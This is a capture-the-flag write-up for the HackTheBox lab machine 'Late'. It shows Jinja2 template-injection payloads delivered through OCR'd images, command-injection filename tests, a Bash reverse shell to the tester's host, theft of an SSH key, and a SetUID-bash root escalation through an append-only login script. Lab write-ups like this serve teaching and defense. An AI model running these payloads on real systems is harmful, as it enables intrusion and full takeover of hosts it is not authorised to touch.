---
title: HTB: Late
url: https://0xdf.gitlab.io/2022/07/30/htb-late.html
date: 2022-07-30T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-late, ctf, hackthebox, nmap, ocr, flask, kolourpaint, tesseract, burp-repeater, ssti, jinja2, payloadsallthethings, linpeas, pspy, bash, chattr, lsattr, extended-attributes, youtube
---

![Late](https://0xdfimages.gitlab.io/img/late-cover.png)

Late really had two steps. The first is to find a online image OCR website that is vulnerable to server-side template injection (SSTI) via the OCRed text in the image. This is relatively simple to find, but getting the fonts correct to exploit the vulnerability is a bit tricky. Still, some trial and error pays off, and results in a shell. From there, I’ll identify a script that’s running whenever someone logs in over SSH. The current user has append access to the file, and therefore I can add a malicious line to the script and connect over SSH to get execution as root. In Beyond Root, a YouTube video showing basic analysis of the webserver, from NGINX to Gunicorn to Python Flask.

## Box Info

| Name | [Late](https://hackthebox.com/machines/late)  [Late](https://hackthebox.com/machines/late) [Play on HackTheBox](https://hackthebox.com/machines/late) |
| --- | --- |
| Release Date | [23 Apr 2022](https://twitter.com/hackthebox_eu/status/1550483674528976896) |
| Retire Date | 30 Jul 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Late |
| Radar Graph | Radar chart for Late |
| First Blood User | 00:07:15[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:16:01[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.156
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-25 15:49 UTC
Nmap scan report for 10.10.11.156
Host is up (0.096s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.156
Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-25 15:49 UTC
Nmap scan report for 10.10.11.156
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu bionic 18.04.

### Website - TCP 80

#### Site

There The site is for a set of online image tools:

[![image-20220725131127629](https://0xdfimages.gitlab.io/img/image-20220725131127629.png)](https://0xdfimages.gitlab.io/img/image-20220725131127629.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220725131127629.png)

The “Contact” link does lead to a form, but on submitting it, it just sends a GET request without the form data, so this is not a useful path.

In the “Frequently Asked Questions” section, there’s a paragraph with a link to `images.late.htb`:

![image-20220725132202832](https://0xdfimages.gitlab.io/img/image-20220725132202832.png)

I’ll add both the domain and the subdomain to my `/etc/hosts` file:

```
10.10.11.156 late.htb images.late.htb

```

Running `wfuzz -u http://10.10.11.156 -H "Host: FUZZ.late.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 9461` finds the `images` subdomain, but nothing else.

#### Tech Stack / Directory Brute Force

All of the page extensions are `.html`, and the HTTP headers don’t provide any additional information.

I’ll run `feroxbuster` against the site, but it doesn’t find anything worth looking into. There’s an `/assets` directory with static content like `js`, `images`, `css`, and `fonts`.

### images.late.htb

The site is a simple HTML form that claims it will convert an image to text:

![image-20220725132917432](https://0xdfimages.gitlab.io/img/image-20220725132917432.png)

It mentions using Flask, which is a [Python-based web framework](https://flask.palletsprojects.com/en/2.1.x/).

When I upload an image (the one I had for testing didn’t have any text in it), it returns a `results.txt` file:

```

<p></p>

```

I’ll go into KolourPaint (any paint application would do) and created a simple image:

![](https://0xdfimages.gitlab.io/img/late-test.png)

When I upload that, it returns:

```

<p>This is a test
</p>

```

## Shell as svc\_acc

### Identify Vulnerability

#### Strategy

There’s obviously some kind of [optical character regocnition (OCR)](https://en.wikipedia.org/wiki/Optical_character_recognition) going on at the server. If I think about how the text is handled, I can look for the most logical ways to exploit it.

The uploaded image is handled by Flask. It is most likely passed to a program like [Tesseract OCR](https://www.howtogeek.com/devops/how-to-convert-images-to-text-on-the-linux-command-line-with-ocr/) to do the OCR, and then the results are packaged into this HTML template and returned as `results.txt`.

The attack surface then is most likely a command injection where the uploaded image file is passed to the OCR application, or a template injection in how the response is processed into `results.txt`.

I can rule out (or at least de-prioritize) other attacks. I don’t see why there would be a database involved here, so SQL injection seems unlikely. Similarly, the results aren’t stored and displayed to any other users, so XSS doesn’t make much sense.

#### Command Injection - Fail

The simplest thing to look at is command injection. If the server is passing the filename to some kind of call to Bash to call the OCS program in an unsafe manner, then perhaps I can inject commands into that.

I’ll send the request uploading `test.png` to Burp Repeater, and resend it to make sure it works as expected, and it does. Then I’ll change the `filename` field to `test.png;id`, but it fails saying “Invalid Extension”:

![image-20220725135359723](https://0xdfimages.gitlab.io/img/image-20220725135359723.png)

That’s easily fixed, but it returns the OCRed text without issue:

![image-20220725135445653](https://0xdfimages.gitlab.io/img/image-20220725135445653.png)

I’ll try a few other things, like `test$(id).png` (to check for an alternative kind of injection), and `test$(ping -c 2 10.10.14.6).png` to check for blind injection, but no change. It doesn’t seem like it’s command injectable. I’ll touch on why at the end of the video in [Beyond Root](#beyond-root).

#### SSTI

The server is likely taking the OCR results and rendering them into a template using the [Jinja templating engine](https://jinja.palletsprojects.com/en/3.1.x/). To test for server-side template injection (SSTI), I’ll send the following image:

![](https://0xdfimages.gitlab.io/img/late-ssti-poc.png)

When I upload this, if it returns “{{ 7\*7 }}”, that shows the OCR read the text and returned it. However, it if returns “49”, then it shows my input was executed, which is evidence of SSTI. It returns:

```

<p>49
</p>

```

### Exploit SSTI

#### Finding Font

Flask uses the Jinja2 templating engine, and PayloadsAllTheThings has a nice [Jinja2 section on its SSTI page](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection). It recommends the following three payloads to turn SSTI into RCE:

```

{{ cycler.__init__.__globals__.os.popen('id').read() }}

{{ joiner.__init__.__globals__.os.popen('id').read() }}

{{ namespace.__init__.__globals__.os.popen('id').read() }}

```

The biggest challenge is going to be to get the OCR to correctly identify the characters correctly.

When I send `{{ cycler.__init__.__globals__.os.popen('id').read() }}`, it returns an error:

![image-20220725141152069](https://0xdfimages.gitlab.io/img/image-20220725141152069.png)

It’s important to note, it’s complaining about the lack of an `init` attribute. But I’m not trying to reference `init`, I’m trying to reference `__init__` (said out loud as “dunder init”). It seems the OCR is missing the underscores.

I’ll remove the `{{ }}` from the image, and resubmit. It returns:

```

<p>cycler. init. globals__.os.popen('id').read()
</p>

```

It’s missing underscores before and after `init`, as well as before `globals`, and has inserted spaces.

I’ll try changing different fonts to see if I can find one that shows the right payload. Many people complained in reviews about this being really painful. I found the process to go smoothly by updating the image / font on one monitor in KolourPaint, hitting Ctrl-s to save, going back to the Late page (which already has the filename in the form), clicking “Scan Image”, and then opening the downloaded `results.txt` file worked pretty well, and I am able to test a font in 5-10 seconds.

The first one I’ll try, “aakar”, is really close:

```

<p>cycler.__init__.__globals__.os.popen(’id’).read()
</p>

```

But it’s using fancy quote marks, and that fails when I try to add back in the `{{ }}`:

![image-20220725141751822](https://0xdfimages.gitlab.io/img/image-20220725141751822.png)

When I get to FreeMono, it looks really close:

```

<p>cycler.__init__.__globals__.os.popen('id') .read()
</p>

```

There’s an extra space before `.read()`, but it might work if changing the spacing happens when I add `{{ }}`? I’ll try it:

![](https://0xdfimages.gitlab.io/img/late-ssti-poc-rce-16587734024135.png)

It works:

```

<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>

```

#### Shell

To get a shell from this, I’ll update the payload with the shorted reverse shell I can think of:

![](https://0xdfimages.gitlab.io/img/late-ssti-rev-10.10.14.6.png)

I’ll create `r` with a basic Bash reverse shell ([explained here](https://www.youtube.com/watch?v=OjkVep2EIlw))

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1

```

And host it with `python3 -m http.server 80`. On submitting, it gets `r` from my webserver:

```
10.10.11.156 - - [25/Jul/2022 17:13:04] "GET /r HTTP/1.1" 200 -

```

And then there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.156 55630
bash: cannot set terminal process group (1237): Inappropriate ioctl for device
bash: no job control in this shell
svc_acc@late:~/app$

```

I’ll upgrade the shell using the standard tricks ([explained here](https://www.youtube.com/watch?v=DqE6DxqJg8Q)):

```

svc_acc@late:~/app$ script /dev/null -c bash
Script started, file is /dev/null
svc_acc@late:~/app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
svc_acc@late:~/app$

```

And grab `user.txt`:

```

svc_acc@late:~$ cat user.txt
91974f93************************

```

### SSH

There’s also a RSA key pair in `/home/svc_acc/.ssh`:

```

svc_acc@late:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub

```

I’ll download `id_rsa` and use it to connect with an even more solid shell:

```

oxdf@hacky$ ssh -i ~/keys/late-svc_acc svc_acc@late.htb
svc_acc@late:~$

```

## Shell as root

### Enumeration

#### Identify File

There’s an interesting file in `/usr/local/sbin` called `ssh-alert.sh`. Running [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) calls it out a few times:

![image-20220725162802389](https://0xdfimages.gitlab.io/img/image-20220725162802389.png)

![image-20220725162830594](https://0xdfimages.gitlab.io/img/image-20220725162830594.png)

![image-20220725162904695](https://0xdfimages.gitlab.io/img/image-20220725162904695.png)

I don’t typically get too excited about “.sh files in path”, but modified recently is interesting for sure, and the fact that it’s writable as well! That seems like a good combination to be part of an exploitation path.

To figure out if/how this script is being executed, I’ll look for it in `/etc`, where configuration files typically live on Linux:

```

svc_acc@late:~$ grep -r ssh-alert.sh /etc/ 2>/dev/null
/etc/pam.d/sshd:session required pam_exec.so /usr/local/sbin/ssh-alert.sh

```

This shows that it’s running the script after each [successful SSH login](https://geekthis.net/post/run-scripts-after-ssh-authentication/).

Running [pspy](https://github.com/DominicBreuker/pspy) can also reveal this, though not as a cron as is typically observed on HTB machines. If PSpy is running when someone connects to the box with SSH, it will show the various processes that kick off.

```

2022/07/25 20:49:09 CMD: UID=0    PID=25694  | /usr/sbin/sshd -D -R 
2022/07/25 20:49:09 CMD: UID=110  PID=25695  | sshd: [net]          
2022/07/25 20:49:10 CMD: UID=0    PID=25696  | sshd: svc_acc [priv] 
2022/07/25 20:49:10 CMD: UID=0    PID=25698  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/07/25 20:49:10 CMD: UID=0    PID=25700  | /bin/bash /usr/local/sbin/ssh-alert.sh 
2022/07/25 20:49:10 CMD: UID=0    PID=25701  | sendmail: MTA: 26PKnA7E025701 localhost.localdomain [127.0.0.1]: DATA
2022/07/25 20:49:10 CMD: UID=1000 PID=25704  | sshd: svc_acc        
2022/07/25 20:49:10 CMD: UID=0    PID=25703  | sensible-mda svc_acc@new root  127.0.0.1 
2022/07/25 20:49:10 CMD: UID=0    PID=25702  | sendmail: MTA: ./26PKnA7E025701 from queue     
2022/07/25 20:49:10 CMD: UID=1000 PID=25705  | -bash 
2022/07/25 20:49:10 CMD: UID=1000 PID=25706  | 
2022/07/25 20:49:10 CMD: UID=???  PID=25708  | ???
2022/07/25 20:49:10 CMD: UID=1000 PID=25711  | -bash 
2022/07/25 20:49:10 CMD: UID=1000 PID=25710  | locale 
2022/07/25 20:49:10 CMD: UID=1000 PID=25714  | 
2022/07/25 20:49:10 CMD: UID=1000 PID=25713  | /bin/sh /usr/bin/lesspipe 
2022/07/25 20:49:10 CMD: UID=1000 PID=25712  | -bash 
2022/07/25 20:49:10 CMD: UID=???  PID=25717  | ???

```

The first three are the SSH daemon handling the connection. Then there’s two calls as root to `ssh-alert.sh`. Then a call to `sendmail` (which will make more sense after looking at the script), and then some other login stuff as scv\_acc.

#### Script Analysis

The script itself is pretty simple:

```

#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

```

It’s sending an email to `root@late.htb` with information about each SSH login.

I don’t see any way to abuse this directly.

#### Script Permissions

The script is owned by svc\_acc, and is writable by this account as well:

```

svc_acc@late:~$ ls -l /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Jul 25 21:01 /usr/local/sbin/ssh-alert.sh

```

However, if I try to overwrite it, the system blocks it:

```

svc_acc@late:~$ echo > /usr/local/sbin/ssh-alert.sh
-bash: /usr/local/sbin/ssh-alert.sh: Operation not permitted

```

That’s because the `a` attribute is set, which says to only allow appending:

```

svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh

```

Despite being the owner for the file, svc\_acc is not able to remove that:

```

svc_acc@late:~$ chattr -a /usr/local/sbin/ssh-alert.sh
chattr: Operation not permitted while setting flags on /usr/local/sbin/ssh-alert.sh

```

That’s because (from the [man page](https://man7.org/linux/man-pages/man1/chattr.1.html)):

> ```

>        a      A file with the 'a' attribute set can only be opened in
>               append mode for writing.  Only the superuser or a process
>               possessing the CAP_LINUX_IMMUTABLE capability can set or
>               clear this attribute.
>
> ```

Still, appending is good enough for exploiting.

Also, it seems that every minute this file is getting reset to it’s original version, based on the timestamp analysis.

### Exploit

To exploit this, I’ll use the following line to create a SetUID Bash executable:

```

svc_acc@late:~$ echo -e "cp /bin/bash /tmp/.0xdf\nchmod 4755 /tmp/.0xdf"
cp /bin/bash /tmp/.0xdf
chmod 4755 /tmp/.0xdf
svc_acc@late:~$ echo -e "cp /bin/bash /tmp/.0xdf\nchmod 4755 /tmp/.0xdf" >> /usr/local/sbin/ssh-alert.sh

```

Now I’ll log in over SSH as svc\_acc, and there’s `.0xdf` owned by root with the SetUID bit on:

```

svc_acc@late:~$ ls -l /tmp/.0xdf
-rwsr-xr-x 1 root root 1113504 Jul 25 21:12 /tmp/.0xdf

```

I’ll run with `-p` to not drop privileges and get a root shell:

```

svc_acc@late:~$ /tmp/.0xdf -p
.0xdf-4.4#

```

And read `root.txt`:

```

.0xdf-4.4# cat root.txt
f8f10a31************************

```

## Beyond Root

It’s always a good idea to use a root shell on a box to make sure you understand how the box is configured. Depending on your skill and experience, the level of understanding may vary, but there’s always something to learn.

In this video, I’ll walk through the basic configuration of the webserver, starting from NGINX, through Gunicorn and its service, then to the source files it runs, ending up at a Python Flask application.